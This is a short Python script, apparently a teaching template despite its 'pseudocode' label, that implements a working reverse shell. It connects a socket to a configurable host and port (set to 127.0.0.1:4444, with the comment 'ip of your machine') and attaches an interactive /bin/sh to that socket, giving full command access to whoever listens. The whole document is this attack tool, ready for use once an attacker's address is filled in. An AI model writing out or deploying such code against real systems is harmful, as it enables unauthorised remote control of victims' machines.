#!/usr/bin/python

###############################################
# Basic Python Reverse Shell Pseudocode       #
# Please, use your resources! Google is fine! #
###############################################

import socket
import subprocess

SERVER_HOST = "127.0.0.1" # ip of your machine
SERVER_PORT = 4444 # the port you want to connect to
BUFFER_SIZE = 1024 # send 1kb of data at a time

s = socket.socket() # creates a socket object
s.connect((SERVER_HOST, SERVER_PORT)) # creates the connection

subprocess.call(["/bin/sh","-i"],
                stdin=s.fileno(),
                stdout=s.fileno(),
                stderr=s.fileno())